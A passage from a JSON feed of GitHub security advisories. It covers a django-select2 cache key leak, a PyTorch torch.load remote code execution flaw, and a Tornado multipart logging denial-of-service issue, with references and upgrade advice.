href=\"https://github.com/codingjoe/django-select2/commit/e5f41e6edba004d35f94915ff5e2559f44853412\">https://github.com/codingjoe/django-select2/commit/e5f41e6edba004d35f94915ff5e2559f44853412</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wjrh-hj83-3wh7\">https://github.com/advisories/GHSA-wjrh-hj83-3wh7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wjrh-hj83-3wh7",
            "title": "[django-select2] Django-Select2 Vulnerable to Widget Instance Secret Cache Key Leaking",
            "date_modified": "2025-05-27T18:03:19.000Z",
            "date_published": "2025-05-27T18:03:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wjrh-hj83-3wh7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"description\">Description</h1>\n<p>I found a Remote Command Execution (RCE) vulnerability in PyTorch. When loading model using torch.load with weights_only=True, it can still achieve RCE.  </p>\n<h1 id=\"background-knowledge\">Background knowledge</h1>\n<p><a href=\"https://github.com/pytorch/pytorch/security\">https://github.com/pytorch/pytorch/security</a> \n As you can see, the PyTorch official documentation considers using <code>torch.load()</code> with <code>weights_only=True</code> to be safe.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/fdaa8520-d66a-473a-ab1f-163d793de298\">\nSince everyone knows that weights_only=False is unsafe, so they will use the  weights_only=True to mitigate the seucirty issue.\nBut now, I just proved that even if you use weights_only=True, it can still achieve RCE.</p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was found by Ji'an Zhou.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6\">https://github.com/pytorch/pytorch/security/advisories/GHSA-53q9-r3pm-6pq6</a></li>\n<li><a href=\"https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04\">https://github.com/pytorch/pytorch/commit/8d4b8a920a2172523deb95bf20e8e52d50649c04</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-32434\">https://nvd.nist.gov/vuln/detail/CVE-2025-32434</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-41.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/torch/PYSEC-2025-41.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-53q9-r3pm-6pq6\">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-53q9-r3pm-6pq6",
            "title": "[pytorch] PyTorch: `torch.load` with `weights_only=True` leads to remote code execution",
            "date_modified": "2025-05-28T19:58:26.000Z",
            "date_published": "2025-04-18T15:19:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-53q9-r3pm-6pq6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When Tornado's <code>multipart/form-data</code> parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.</p>\n<h3 id=\"affected-versions\">Affected versions</h3>\n<p>All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking <code>Content-Type: multipart/form-data</code> in a proxy.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m\">https://github.com/tornadoweb/tornado/security/advisories/GHSA-7cx3-6m66-7c5m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47287\">https://nvd.nist.gov/vuln/detail/CVE-2025-47287</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3\">https://github.com/tornadoweb/tornado/commit/b39b892bf78fe8fea01dd45199aa88307e7162f3</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2025/05/msg00038.html\">https://lists.debian.org/debian-lts-announce/2025/05/msg00038.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7cx3-6m66-7c5m\">https://github.com/advisories/GHSA-7cx3-6m66-7c5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7cx3-6m66-7c5m",
            "title": "[tornado] Tornado vulnerable to excessive logging caused by malformed multipart form data",
            "date_modified": "2025-05-29T06:32:21.000Z",
            "date_published": "2025-05-16T14:12:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7cx3-6m66-7c5m"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}